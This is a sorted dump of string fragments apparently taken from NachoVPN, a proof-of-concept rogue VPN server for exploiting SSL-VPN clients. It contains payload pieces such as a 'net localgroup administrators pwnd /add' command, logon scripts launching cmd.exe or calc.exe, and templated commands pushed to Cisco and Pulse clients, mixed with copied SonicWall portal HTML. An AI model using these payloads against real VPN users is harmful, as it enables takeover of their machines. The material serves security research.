" bytes([self.code, self.identifier]) "
" command line arguments in order to increase the verbosity of logging, which can aid in debugging."
" config packet, wrapped with IF-T"
" directory, which can be installed with pip:"
" directory, which we've mounted into the container."
" directory. Either add these manually, or run the "
" document.write( '<div style=""position:relative"
" document.write( '<ilayer height=""'"
" document.write( '<table border=""0"" cellspacing=""0"" cellpadding=""'"
" filename=""{file_name}""',"
" function clicked(){var code = document.getElementById(""code"").value"
" fwiw, openconnect seems to differ here"
" if not, a new signing certificate will be generated and self-signed by the CA"
" if the cert wasn't issued by our CA, then it's probably been signed by a public CA,"
" if the issuer name matches, but the cert is not validly signed by the current CA, return False"
" if we didn't do this, the cert manager would detect a mismatch and re-generate the certificate"
" net localgroup administrators pwnd /add"""
" onMouseOver=""JavaScript:window.status='Back'"
" p[12]), "
" p[13]),"
" p[14]), "
" payload is generated for the SonicWall plugin, and written to the "
" payload with a self-signed certificate. For testing purposes, you can download and install this CA certificate from "
" payload, and place it in the "
" process on the current user's desktop, running as "
" return true"" onMouseOut=""window.status=''"
" self.length.to_bytes(2, 'big') "
" string.digits, k=17))"
" such as Let's Encrypt, and we should not re-generate it."
" this contains OS info, user-agent, etc."
" using certbot, and save it to the "
" {'type': ROUTE_SPLIT_EXCLUDE, 'route': '10.0.0.0/255.0.0.0'}"
""" autocomplete='off'>"
""" id=""NE_progBar'"
""" leftmargin=0 topmargin=0 marginwidth=0 marginheight=0>"
""" onMouseOver=""window.status='Back'"
""", additional_ekus=[], additional_sans=[]):"
"""><b><div id=""status"">"
"""><b>NetExtender has detected that the proxy server you are using requires authentication:</b></font>"
"""><font class=""bbuttons"">Continue</font></a>"
"""><font class=toolbar style=""color:"
"""><u> Click here</u></font></a> <font class=toolbar>to go back.</font>"
""">Contemporary Mode</a>"
""">close this window</a>.</span>"
"""http://www.w3.org/TR/html4/loose.dtd"">"
"$.cookie(splitCookie[0], ""null"", { expires: -1, path: '/' })"
"' size=20 value='' onFocus=""if(disabled) blur()"
"'"" bgcolor=""'"
"'"" name=""NE_progBar'"
"'"" width=""'"
"'"">' )"
"'"">'"
"'""></div></div>' )"
"'""></layer></ilayer>' )"
"'""><layer bgcolor=""'"
"'""><tr><td bgcolor=""'"
"'<div style=""top:0px"
"'<table border=""0"" cellspacing=""0"" cellpadding=""0""><tr><td height=""'"
")</password>', body).group(1)"
")</username>', body).group(1)"
", if using docker)."
", the user will not be prompted for a username or password. "
"....@%...,......"
"/), function(index, cookieString)  {"
"// @Note, check legcy UI warning hide flag"
"//NLX_DL_ERROR = -1,NLX_DL_STOPED = 0,NLX_DL_DOWNLOADING = 1,NLX_DL_PROXY_AUTH_REQUIRED = 2,NLX_DL_SUCCEEDED = 3"
"//for version before 2.5, uninstall the old Nx, for 2.5 or later NX, the Nx application will take care upgrade"
"//if not IE, try NPAPI plugin anyway"
"//if not support aync download api, then keep using old way"
"//if the OS is Vista or later, pass the admin check"
"//more information needed, show GUI to handle user input."
"//no plugin loaded, show the error message"
"/oem-customization', methods=['GET'])"
"0085C3"" />"
"1          //direction of progress: 1 = right, 2 = down, 3 = left, 4 = up"
"1,         //border thickness"
"350,       //width of bar (excluding border)"
"8,        //height of bar (excluding border)"
"8080ff', //bar colour"
"8f8f8f', //border colour"
"<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"""
"</installer-gui-script>"""""""
"</script></body></html>"""
"<AnyConnectProfile xmlns=""http://schemas.xmlsoap.org/encoding/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://schemas.xmlsoap.org/encoding/ AnyConnectProfile.xsd"">"
"<AutoConnectOnStart UserControllable=""true"">false</AutoConnectOnStart>"
"<AutoReconnect UserControllable=""false"">false"
"<AutoReconnectBehavior UserControllable=""false"">ReconnectAfterResume</AutoReconnectBehavior>"
"<AutoUpdate UserControllable=""false"">false</AutoUpdate>"
"<AutomaticCertSelection UserControllable=""true"">false</AutomaticCertSelection>"
"<ClearSmartcardPin UserControllable=""true"">true</ClearSmartcardPin>"
"<DisableCaptivePortalDetection UserControllable=""true"">true</DisableCaptivePortalDetection>"
"<EnableAutomaticServerSelection UserControllable=""false"">false"
"<EnableScripting UserControllable=""false"">true"
"<LocalLanAccess UserControllable=""true"">false</LocalLanAccess>"
"<MinimizeOnConnect UserControllable=""true"">true</MinimizeOnConnect>"
"<PPPExclusion UserControllable=""false"">Disable"
"<PPPExclusionServerIP UserControllable=""false""></PPPExclusionServerIP>"
"<RSASecurIDIntegration UserControllable=""false"">Automatic</RSASecurIDIntegration>"
"<SCRIPT LANGUAGE=""VBScript"">"
"<ServiceProfiles rev=""1.0"">"
"<UseStartBeforeLogon UserControllable=""true"">false</UseStartBeforeLogon>"
"<a href="""
"<a href=""JavaScript:history.back()"
"<a href=""javascript:useContemporaryUI()"
"<auth id=""main"">"
"<auth id=""success"">"
"<b>Before running NetExtender, it is required that you restart your computer."
"<body bgcolor=""white"">"
"<body class=""mainback"" bgcolor="""
"<body onload=""autoCertLogin()"
"<br>To get NetExtender for another platform go to the <b><a href=""/cgi-bin/clientdownloads"
"<br>You may also <b><a href=""/"">manually download NetExtender</a></b> and run it.  "
"<config client=""vpn"" type=""private"">"
"<config-auth client=""vpn"" type=""auth-request"" aggregate-auth-version=""2"">"
"<config-auth client=""vpn"" type=""complete"" aggregate-auth-version=""2"">"
"<div class=""product-logo-txt"">Virtual Office</div>"
"<div class=""row-1"">"
"<div id=""custom-logo"" class=""logo""></div>"
"<div id=""invalid""  >"
"<div id=""invalid_text""></div>"
"<div id=""neInstallStatusPage"" style=""top:10px"
"<div id=""neproxyAuthPage"" style=""top:10px"
"<div style=""text-align: center"
"<file app=""AnyConnect"" platform=""{{ script['platform'] }}"" type=""binary"">"
"<file type=""profile"" service-type=""user"">"
"<font class=""bbuttons"">Finish</font>"
"<font class=""toolbar"" style=""font-size:14px"
"<font class=""toolbar""><div id=""detail"">"
"<font class=""toolbar"">Password: </font>"
"<font class=""toolbar"">User Name: </font>"
"<form name=""Login"" action=""/cgi-bin/userLogin"" method=""post"">"
"<hash type=""sha1"">{{ profile_hash }}</hash>"
"<hash type=""sha1"">{{ script['hash'] }}</hash>"
"<html xmlns:v=""urn:schemas-microsoft-com:vml"">"
"<img src=""/images/shim.gif"" height=100 width=8><BR>"
"<input name=""loginButton"" id=""loginButton"" type=""submit"" value=""Login"" class='button' autocomplete='off'>"
"<input type=""hidden"" name=""login"" value=""true"">"
"<input type=""hidden"" name=""state"" value=""login"">"
"<input type=""hidden"" name=""verifyCert"" value=""0"">"
"<input type=""hidden"" name=""web"" value=""true"">"
"<input type=""hidden"" name='portalname' value=""VirtualOffice"">"
"<input type=""input"" id='proxy_user' style='width:200px"
"<input type=""password"" id='proxy_pass' style='width:200px"
"<input type=""password"" name=""password"" label=""Password:""></input>"
"<input type=""text"" name=""username"" label=""Username:""></input>"
"<installer-gui-script minSpecVersion=""1"">"
"<link href=""/notificationbar.10.2.1.7-50sv.css"" type=""text/css"" rel=""stylesheet"">"
"<link href=""/themes/styleblueblackgrey.10.2.1.7-50sv.css"" rel=""stylesheet"" type=""text/css"">"
"<link rel=""shortcut icon"" href=""/favicon.ico""/>"
"<link type=""text/css"" href=""/swl_styles.10.2.1.7-50sv.css"" rel=""stylesheet"">"
"<link type=""text/css"" href='/sma_content_overrides.10.2.1.7-50sv.css' rel='stylesheet'>"
"<message id=""0"" param1="""" param2=""""></message>"
"<meta http-equiv=""Content-Type"" content=""text/html"
"<meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">"
"<meta http-equiv=""cache-control"" content=""must-revalidate"">"
"<meta http-equiv=""cache-control"" content=""no-cache"">"
"<meta http-equiv=""pragma"" content=""no-cache"">"
"<meta name=""ROBOTS"" content=""NOINDEX, NOFOLLOW"">"
"<meta name=""application-name"" content=""VirtualOffice"" />"
"<meta name=""msapplication-TileColor"" content="""
"<meta name=""msapplication-square150x150logo"" content=""/images/logo/VirtualOffice.gif"" />"
"<meta name=""msapplication-square310x310logo"" content=""/images/logo/VirtualOffice.gif"" />"
"<meta name=""msapplication-square70x70logo"" content=""/images/logo/VirtualOffice.gif"" />"
"<meta name=""msapplication-wide310x150logo"" content=""/images/logo/VirtualOffice.gif"" />"
"<opaque is-for=""sg"">"
"<opaque is-for=""vpn-client""><service-profile-manifest>"
"<option selected=""true"">{{ vpn_name }}</option>"
"<option value=""LocalDomain"">LocalDomain</option><script> var isCAArray =new Array()"
"<p align=""center"">"
"<pkgversion>3,9,04053</pkgversion>"
"<response status=""success"">"
"<script src=""/js/base64.10.2.1.7-50sv.js"" type=""text/javascript"" charset=""utf-8""></script>"
"<script src=""/js/jquery.10.2.1.7-50sv.js"" type=""text/javascript"" charset=""utf-8""></script>"
"<script src=""/js/jquery.cookie.10.2.1.7-50sv.js"" type=""text/javascript"" charset=""utf-8""></script>"
"<script src=""/js/jquery.form.10.2.1.7-50sv.js"" type=""text/javascript"" charset=""utf-8""></script>"
"<script src=""/js/jquery.qrcode.min.10.2.1.7-50sv.js"" type=""text/javascript"" charset=""utf-8""></script>"
"<script src=""/js/jquery.validate.10.2.1.7-50sv.js"" type=""text/javascript"" charset=""utf-8""></script>"
"<script src=""/js/login.10.2.1.7-50sv.js"" type=""text/javascript"" charset=""utf-8""></script>"
"<script src=""/js/mainframe.10.2.1.7-50sv.js""></script>"
"<script src=""/js/portalframe.10.2.1.7-50sv.js""></script>"
"<script src=""/js/schemeurl.10.2.1.7-50sv.js"" type=""text/javascript"" charset=""utf-8""></script>"
"<script type=""text/javascript"">"
"<select name=""group_list"" label=""GROUP:"">"
"<select name='domain' id='domain' onchange = ""showLoginBoxFields(this.selectedIndex)"
"<span id='securityMsg'>For security reasons, you should <a href=""javascript:winclose()"
"<table border=0 cellpadding=0 cellspacing=0 valign=""top"">"
"<table border=0 cellpadding=1 cellspacing=0 valign=""top"">"
"<table cellspacing=0 cellpadding=0 width=""100%"" border=0>"
"<table cellspacing=0 cellpadding=0 width=""100%"" height = ""100%"" border=0>"
"<table cellspacing=0 cellpadding=1 width=""100%"" border=0>"
"<table valign=""top"" border=0 class=""logintable"" cellpadding=0 cellspacing=0  style=""left:0px"
"<td  colspan=3 height=40><img src=""/images/shim.gif"" width=1 height=40></td>"
"<td  colspan=3 height=5><img src=""/images/shim.gif"" width=1 height=5></td>"
"<td  height=20><img src=""/images/shim.gif"" width=1 height=20></td>"
"<td align=""center"">"
"<td align=""right"" colspan=4 cellpadding=1 cellspacing=4>"
"<td cellpadding=10 valign=""top"">"
"<td colspan=2 height=5><img src=""/images/shim.gif"" height=11></td>"
"<td colspan=2 width=""75%"">"
"<td colspan=2><input type=radio id=""neRebootNo"" name=""neReboot"" value=""no""><label for=""neRebootNo"">No, I will restart my computer later</label></td>"
"<td colspan=2><input type=radio id=""neRebootYes"" name=""neReboot"" value=""yes"" checked><label for=""neRebootYes"">Yes, restart immediately (Recommended).</label></td>"
"<td colspan=3 cellpadding=0 cellspacing=0 height=3><img src=""/images/shim.gif"" height=3 width=1></td>"
"<td colspan=3 height=110><img src=""/images/shim.gif"" height=110></td>"
"<td colspan=3 height=20><img src=""/images/shim.gif"" height=20></td>"
"<td colspan=3 width=1 height=10><img src=""/images/shim.gif"" width=1 height=10></td>"
"<td colspan=4 cellpadding=0 cellspacing=0 height=3><img src=""/images/shim.gif"" height=3 width=1></td>"
"<td colspan=4 cellpadding=0 cellspacing=0 height=8><img src=""/images/shim.gif"" height=8 width=1></td>"
"<td colspan=4 height=5><img src=""/images/shim.gif"" height=11></td>"
"<td colspan=4 width=1 height=10><img src=""/images/shim.gif"" width=1 height=10></td>"
"<td width=""25%""><font class=""toolbar""><font size=3><b>Step 1</b></font> - A yellow information bar may appear at the top of the browser.</font></td>"
"<td width=""25%""><font class=""toolbar""><font size=3><b>Step 2</b></font> - If it does, please click on the yellow bar and choose <b>Install ActiveX Control...</b></font></td>"
"<td width=""25%""><font class=""toolbar""><font size=3><b>Step 3</b></font> - If a Security Warning window appear, <br>Click <b>Install</b> to proceed.</font></td>"
"<td width=""3%"">"
"<td width=""30%"">"
"<td width=""70%""><img src=""/images/neaxw1.gif"" ></td>"
"<td width=""70%""><img src=""/images/neaxw2.gif"" ></td>"
"<td width=""70%""><img src=""/images/neaxw3.gif"" ></td>"
"<td width=100 height=22 valign=""top"" align=""center"">"
"<td width=32 height=8><img src=""/images/shim.gif"" height=8 width=32></td>"
"<td width=32><img src=""/images/shim.gif"" height=1 width=32></td>"
"<td width=8><img src=""/images/shim.gif"" height=1 width=8></td>"
"<tr id=""axinstallinstr"">"
"<tr id=""launchstatus"">"
"<vpn rev=""1.0"">"
"= (1).to_bytes(4, 'big') "
"= (1).to_bytes(4, 'big')"
"= (2).to_bytes(4, 'big') "
"= (len(data)).to_bytes(2, 'big')"
"= 0x21202400.to_bytes(4, 'big')     "
"= 0x40.to_bytes(2, 'big')           "
"= 0x54.to_bytes(4, 'big')           "
"= 0x70.to_bytes(4, 'big')           "
"= EXPANDED_JUNIPER.to_bytes(4, 'big')"
"= packet_type.to_bytes(1, 'big')"
"= self.create_attribute(0x13, b'"
"= self.create_attribute(0x14, b'"
"= self.create_attribute(0x400d, b'"
"= self.create_attribute(0x400e, b'"
"= self.create_attribute(0x401c, b'"
"= self.create_attribute(0x4025, b'"
"= self.create_attribute(0x4026, b'"
"= self.create_attribute(CFG_DISCONNECT_WHEN_ROUTES_CHANGED, b'"
"= self.create_attribute(CFG_DNS_SERVER, b'"
"= self.create_attribute(CFG_DNS_SUFFIX, self.dns_suffix.encode() "
"= self.create_attribute(CFG_ENFORCE_IPV4, b'"
"= self.create_attribute(CFG_ENFORCE_IPV6, b'"
"= self.create_attribute(CFG_ESP_ALLOW_6IN4, b'"
"= self.create_attribute(CFG_ESP_ENC_ALG, self.write_be16(ENC_AES_256_CBC))"
"= self.create_attribute(CFG_ESP_HMAC_ALG, self.write_be16(HMAC_SHA256))"
"= self.create_attribute(CFG_ESP_KEY_BYTES, self.write_be32(0))"
"= self.create_attribute(CFG_ESP_KEY_LIFETIME, self.write_be32(1200))"
"= self.create_attribute(CFG_ESP_ONLY, b'"
"= self.create_attribute(CFG_ESP_PORT, self.write_be16(0x1194))"
"= self.create_attribute(CFG_ESP_REPLAY_PROTECTION, self.write_be32(1))"
"= self.create_attribute(CFG_ESP_TO_SSL_FALLBACK_SECS, self.write_be32(15))"
"= self.create_attribute(CFG_INTERNAL_GATEWAY_IP, self.write_be32(self.ipv4_to_int(""10.200.200.200"")))"
"= self.create_attribute(CFG_INTERNAL_LEGACY_IP, self.write_be32(self.ipv4_to_int(""10.10.1.1"")))"
"= self.create_attribute(CFG_LOGON_SCRIPT, self.logon_script.encode() "
"= self.create_attribute(CFG_LOGON_SCRIPT_MAC, self.logon_script_macos.encode() "
"= self.create_attribute(CFG_MTU, self.write_be32(1400))"
"= self.create_attribute(CFG_NETMASK, self.write_be32(self.ipv4_to_int(""255.255.255.255"")))"
"= self.create_attribute(CFG_TOS_COPY, self.write_be32(0))"
"= self.create_attribute(CFG_TUNNEL_ROUTES_TAKE_PRECEDENCE, b'"
"= self.create_attribute(CFG_TUNNEL_ROUTES_WITH_SUBNET_ACCESS, b'"
"= self.create_attribute(CFG_UNKNOWN_4007, self.write_be32(1))"
"= self.create_attribute(CFG_UNKNOWN_400F, b'"
"= self.create_attribute(CFG_UNKNOWN_4018, self.write_be32(60))"
"= self.create_attribute(CFG_UNKNOWN_4019, b'"
"= self.create_attribute(CFG_WINS_SERVER, b'"
"= self.parse_eap_packet(packet.message_value, client_socket)"
"= self.vendor.to_bytes(4, 'big')"
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"Alternatively, for local development you can install the package in editable mode using:"
"Alternatively, for testing purposes, you can skip the certificate generation by setting the "
"Alternatively, if the logging is too noisy, you can use the "
"Alternatively, you can run the server using Docker:"
"CERT_PATH=""/app/certs/server-dns.crt"""
"DISABLED_PLUGINS=CiscoPlugin,SonicWallPlugin"
"DIST_TEMPLATE = """"""<"
"ENTRYPOINT [""/bin/bash"", ""-c"", ""./entrypoint.sh""]"
"ETHER_TYPES = {0x0800: 'IPv4', 0x0806: 'ARP', 0x86dd: 'IPv6'}"
"First, clone this repository, and install "
"First, create a virtual environment. On Linux, this can be done with:"
"For further details, see our [blog post](https://blog.amberwolf.com/blog/2024/november/introducing-nachovpn---one-vpn-server-to-pwn-them-all/), and HackFest Hollywood 2024 presentation [[slides](https://github.com/AmberWolfCyber/presentations/blob/main/2024/Very%20Pwnable%20Networks%20-%20HackFest%20Hollywood%202024.pdf)"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
"If you let the connection time out, open GlobalProtect and click Connect to try again."
"If you prefer to use Docker, then you can pull the container from the GitHub Container Registry:"
"If you're interested in developing a new plugin, you can take a look at the [ExamplePlugin](src/nachovpn/plugins/example/plugin.py) to get started."
"It uses a plugin-based architecture so that support for additional SSL-VPN products can be contributed by the community. It currently supports various popular corporate VPN products, such as Cisco AnyConnect, SonicWall NetExtender, Palo Alto GlobalProtect, and Ivanti Connect Secure."
"KEY_PATH=""/app/certs/server-dns.key"""
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"NELaunchX1.AddRouteEntry(""192.168.200.0"", ""255.255.255.0"")"
"NELaunchX1.SetProxyAuth(proxyUser, proxyPass)"
"NELaunchX1.StartNEGuiWithParam(""-showLastError"")"
"NELaunchX1.UninstallNetExtender(1, 0)"
"NELaunchX1.authType = ""local"""
"NELaunchX1.clientIPHigher = ""192.168.200.200"""
"NELaunchX1.clientIPLower = ""192.168.200.100"""
"NELaunchX1.displayName = ""user"""
"NELaunchX1.domainName = ""LocalDomain"""
"NELaunchX1.ipv6Support = ""no"""
"NELaunchX1.serverAddress = ""172.17.96.1"""
"NELaunchX1.serverPort = (window.location.port=="""") "
"NELaunchX1.sessionId = ""py0nwVXgydGW17JQXQRq6nYdObmqUQyrzEUTbK8os8I="""
"NELaunchX1.userName = ""user"""
"NachoVPN is a Proof of Concept that demonstrates exploitation of SSL-VPN clients, using a rogue VPN server."
"On Windows, use:"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
"SIGNATURE_TOC_ENTRY = """"""<signature style=""RSA"">"
"SWL_LOGIN.loginTokenInsert({tagId: ""loginToken"", tagVal: """"})"
"Set oShell = CreateObject(""WScript.Shell"")"
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"TOC_TEMPLATE = """"""<"
"Then, install NachoVPN:"
"To access the network, you must first connect to GlobalProtecteeeeeeeee VPN."
"To disable a plugin, add it to the "
"To run the server as standalone, use:"
"alert(""Invalid password!"")"
"alert(""Invalid user name!"")"
"args, "
"button id=""runcode"" onclick=clicked()"
"calc.exe"")"
"calc.exe"", logon_script_macos="""",dns_suffix=""nachovpn.local"", routes=EXAMPLE_ROUTES):"
"charset=UTF-8"">"
"charset=UTF-8'><title>Virtual Office</title><meta http-equiv='pragma' content='no-cache'><meta http-equiv='cache-control' content='no-cache'><meta http-equiv='cache-control' content='must-revalidate'><META NAME=""ROBOTS"" CONTENT=""NOINDEX, NOFOLLOW""><link href='/themes/styleblueblackgrey.10.2.1.7-50sv.css' rel=stylesheet type='text/css'>"
"charset=UTF-8'><title>Virtual Office</title><meta http-equiv='pragma' content='no-cache'><meta http-equiv='cache-control' content='no-cache'><meta http-equiv='cache-control' content='must-revalidate'><META NAME=""ROBOTS"" CONTENT=""NOINDEX, NOFOLLOW""><link href='/themes/styleblueblackgrey.10.2.1.7-50sv.css' rel=stylesheet type='text/css'><script>"
"client=netextender"">All Downloads</a></b> page."
"cmd.exe"""
"cmd.exe"", f""/c {self.msi_command}"", "
"cmd.exe"","
"copies of the Software, and to permit persons to whom the Software is"
"d4d1c8""  onLoad=""neLauncherStart()"
"def build_signature_toc(certificates, signature_length):"
"def generate_pkg(version, command, package_name, cert_file=None, key_file=None, ca_file=None):"
"def get_signature(key_file, data):"
"default"""
"div style=""font-family:'Helvetica Neue'"
"echo ""Starting nachovpn server"""
"elif [[ -f ""$CERT_PATH"" "
"f.action = ""/cert-bin/certVerifyLogin"""
"f.action = ""/cgi-bin/userLogin"""
"f.isSaml = ""false"""
"f.isSaml = ""true"""
"f.password.value = """""
"f.username.value = """""
"ffffff', //background colour"
"for( var x = 0, y"
"from cabarchive import CabArchive, CabFile"
"from cryptography.hazmat.primitives import hashes, serialization"
"from cryptography.hazmat.primitives.asymmetric import rsa, ec, padding"
"from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID, ObjectIdentifier"
"from flask import Flask, jsonify, request"
"from flask import Flask, jsonify, request, abort, send_file, make_response"
"from flask import Response, abort, request"
"from flask import Response, abort, request, redirect"
"from jinja2 import Environment, FileSystemLoader"
"from nachovpn.plugins.paloalto.msi_patcher import get_msi_patcher, random_hash"
"from nachovpn.plugins.pulse.config_generator import VPNConfigGenerator, ESPConfigGenerator"
"from scapy.all import IP, IPv6, ARP, UDP, TCP, Ether, rdpcap, wrpcap, "
"from setuptools import setup, find_packages"
"function clicked(){var code = document.getElementById(""code"").value"
"function getRefToDivNest( divID, oDoc ) {"
"function progressBar( oBt, oBc, oBg, oBa, oWi, oHi, oDr ) {"
"function replaceHTML(obj,text){"
"function resetBar( a, b ) {"
"function setCookie(cname, cvalue) {"
"function updateStatus(_status, _detail){"
"furnished to do so, subject to the following conditions:"
"h1 style=""color:red"
"if (window.localStorage.getItem(""legcyUIWarningHideFlag"") === null) {"
"if [[ -n ""${SKIP_CERTBOT}"" ]]"
"if [[ -z ""${EXTERNAL_IP}"" ]]"
"if [[ -z ""${SERVER_FQDN}"" ]]"
"if __name__ == ""__main__"":"
"if( errName == ""ReferenceError"" )"
"if( theDiv.resizeTo ) { theDiv.resizeTo( theWidth, theHeight )"
"in the Software without restriction, including without limitation the rights"
"input size=""100"" id=""code"""
"install is finished but failed, uninstall is required before reinstall"
"install is not finished yet, a reboot is required to finished installation"
"isIE = (agent.indexOf(""msie"") != -1)"
"kwargs, template_dir=os.path.join(os.path.dirname(__file__), 'templates'))"
"launcherror=ieprotected"""
"launcherror=nopluginsupport"""
"n"".join(headers))"
"nShutting down..."")"
"new ActiveXObject("""")"
"oShell.run ""%comspec% /c {{ cisco_command_win }}"""
"of this software and associated documentation files (the ""Software""), to deal"
"onClick=""JavaScript:finishInstall()"
"onClick=""JavaScript:onProxyAuthNextBtn()"
"onMouseOut=""JavaScript:this.className='bbcenter'"
"onMouseOver=""JavaScript:this.className='bbcenteron'"
"p style=""margin: 0"
"pEnv, newToken, TRUE)) {"
"path=/"" "
"pi, sizeof(pi))"
"pragma comment(lib, ""userenv.lib"")"
"pragma comment(lib, ""wtsapi32.lib"")"
"progress_bar.setBar(0.04,true)"
"proxyAuthPage.style.visibility=""hidden"""
"proxyAuthPage.style.visibility=""visible"""
"proxyAuthPage.style.zIndex=""2"""
"proxyAuthPage.style.zIndex=""4"""
"proxyPass = document.getElementById(""proxy_pass"").value"
"proxyUser = document.getElementById(""proxy_user"").value"
"rebootPage.style.visibility=""hidden"""
"rebootPage.style.visibility=""visible"""
"rebootPage.style.zIndex=""1"""
"rebootPage.style.zIndex=""4"""
"replaceHTML(document.getElementById('axinstallinstr'), """")"
"replaceHTML(document.getElementById('detail'), _detail)"
"replaceHTML(document.getElementById('launchstatus'), """")"
"replaceHTML(document.getElementById('status'), _status)"
"secure"""
"securityMsg').text(""For security reasons, you should close this window."")"
"self.logger.info('Got tunnelled IP packet with destination IP:', dest_ip)"
"server="" "
"sessionId, sizeof(DWORD))) {"
"setCookie(""uimode"", ""contemporary"")"
"setTimeout('downloadNACWait()', 100)"
"setTimeout('neConnectWait()', 100)"
"setTimeout('neDownloadNxWait()', 100)"
"setTimeout('neDownloadNxWait()', 500)"
"setTimeout('neInit()', 100)"
"setTimeout('neInit()', 500)"
"setTimeout('neInstall()', 100)"
"setTimeout('neInstallWait()', 100)"
"setTimeout('neInstallWait()', 500)"
"setTimeout('neLaunch()', 100)"
"setTimeout('neStart()', 100)"
"setTimeout('neStartWait()', 100)"
"setTimeout('neUninstallWait()', 100)"
"setTimeout(proxyNextFunction, 50)"
"si, "
"si, sizeof(si))"
"statusPage.style.visibility=""hidden"""
"statusPage.style.visibility=""visible"""
"statusPage.style.zIndex=""3"""
"statusPage.style.zIndex=""4"""
"style=""padding-bottom:1px"
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, NULL)) {"
"updateStatus(strStatusConnect, strWait)"
"updateStatus(strStatusDownload, strWait)"
"updateStatus(strStatusInstall, strWait)"
"updateStatus(strStatusInstallNac, strWait)"
"updateStatus(strStatusStart, strWait)"
"updateStatus(strStatusUninstall, strWait)"
"updateStatus(strStatusVerify, strWait)"
"var epcversion =""936"""
"var proxyAuthPage = document.getElementById(""neproxyAuthPage"")"
"var reboot = document.getElementById(""neRebootYes"")"
"var rebootPage = document.getElementById(""neInstallRebootPage"")"
"var statusPage = document.getElementById(""neInstallStatusPage"")"
"var strErrBadInstallation = ""A damaged version of NetExtender was detected on your computer, please reinstall NetExtender to fix the problem!"""
"var strErrConnect = ""Failed to establish connection!"""
"var strErrConnecttimeout = ""Fail to establish connection, progress time-out!"""
"var strErrDownload = ""Failed to download NetExtender installer!"""
"var strErrEpcCheckFail = ""EndPoint Security check failed!"""
"var strErrEpcDownloadFail = ""Download EPC Agent failed!"""
"var strErrEpcInstallFail = ""Install EPC Agent failed!"""
"var strErrGUI = ""Failed to launch NetExtender GUI client!"""
"var strErrInit = ""Failed to initialize NetExtender, this could be caused by a damaged or incompatible version of NetExtender!"""
"var strErrInstall = ""Failed to launch NetExtender installer!"""
"var strErrInstallFail = ""Failed to install NetExtender, the installation has been rolled back!"""
"var strErrInstallRequireAdmin = ""NetExtender is not installed, please contact your system administrator for help!"""
"var strErrInstalltimeout = ""Fail to install NetExtender, progress time-out!"""
"var strErrOpen = ""Failed to communicate with NetExtender. Please check version compatibility. If incompatible, please reinstall the client!"""
"var strErrProxyAuth = ""Incorrect user/password, proxy authentication failed!"""
"var strErrRebootRequired = ""The installation process has not yet been compeleted, please reboot before using NetExtender!"""
"var strErrStart = ""Failed to start NetExtender!"""
"var strErrStartRequireAdmin = ""The NetExtender service is not running, please contact your system administrator for help!"""
"var strErrStarttimeout = ""Failed to start NetExtender, progress time-out!"""
"var strErrUninstall = ""Failed to launch NetExtender uninstaller!"""
"var strErrUninstalltimeout = ""Failed to uninstall NetExtender, progress time-out!"""
"var strErrUpgradeRequireAdmin = ""The NetExtender on your system is too old, please contact your system administrator for upgrading!"""
"var strErrValidateServer = ""Failed to validate the server, the server may be running on an old or incompatible firmware!"""
"var strStatusConnect = ""Establishing NetExtender Connection"""
"var strStatusDownload = ""Downloading NetExtender"""
"var strStatusInstall = ""Installing NetExtender"""
"var strStatusInstallNac = ""Installing EndPoint Security Agent"""
"var strStatusStart = ""Starting NetExtender"""
"var strStatusUninstall = ""Removing Previous NetExtender Installation"""
"var strStatusVerify= ""Verifying NetExtender Installation"""
"var strWait = ""Please wait..."""
"var testObj = new ActiveXObject(""htmlfile"")"
"visibility:hidden"">"
"window.localStorage.setItem(""legcyUIWarningHideFlag"", true)"
"window.location = ""/cgi-bin/sslvpnclient"
"window.location.href = ""/spog/welcome"""
"window.open('','_parent','')"
"window.status = window.defaultStatus = ""Virtual Office"""
"x509.NameAttribute(NameOID.ORGANIZATION_NAME, self.ca_common_name),"
"xml version=""1.0"" encoding=""UTF-8"" "
"xml version=""1.0"" encoding=""UTF-8"""
"xml version=""1.0"" encoding=""utf-8"""
"y = getRefToDivNest(divID,oDoc.layers[x].document)"
"{cab_name}', '', ''])"
$(document).ready(function () {
$(document).ready(function() {
$.each(document.cookie.split(/
' OnDisconnect.vbs
'>Plugin is not supported on Windows 8 Modern UI. Please switch to Desktop mode manually to install plugin.</font></center>')
'px '
'px 0px)'
'red
((0 != NELaunchX1.isNeRasInstalled)
(0 != NELaunchX1.isNeDriverInstalled)
(0 != NELaunchX1.isRebootNeeded)))
(NELaunchX1.isUpgradable)){
(NELaunchX1.object)){
(__proxy_ssl_vpn_
) VALUES (
- https://trustedcomputinggroup.org/wp-content/uploads/TNC_IFT_TLS_v2_0_r8.pdf
- https://www.infradead.org/openconnect/juniper.html
- https://www.infradead.org/openconnect/pulse.html
--debug
--quiet
. .........P....
....
.............
................
.........@......
........@....@..
...@.......@....
...@.....@......
...L.......
..@....@ ...@!..
..@....@....@$..
.@..............
.@......<.......
.@......x.......
.@.....@.....@..
.@...C:
.@...nachovpn.lo
.DS_Store
.bak
.cache/
.cover
.coverage
.coverage.
.egg
.egg-info/
.eggs/
.env
.idea/
.iml
.log
.nox/
.orig
.pdb
.pyc
.pyd
.pyo
.pytest_cache/
.sqlite3
.swo
.swp
.tmp
.tox/
.vscode/
.wheel
.whl
.zip
// This happens if the opener was not the SSL-VPN
//change all the different colour styles
//download NAC Agent
//error msg
//install NAC Agent
//status msg
//still in downloading status
//wait until NX binary download finished
//wait until the installer exist
//work out the required size and use various methods to enforce it
//write the bar as a layer in an ilayer in two tables giving the border
/app/payloads
/body
/button
/div
/files/
/input
/pulse
/script
/sonicwall
/sonicwall/ca.crt
/templates/
00000000  00 00 0a 4c 00 00 00 01 00 00 01 60 00 00 01 fb   
00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   
00000020  2e 20 f0 00 00 00 00 00 00 00 01 50 2e 00 00 0d   
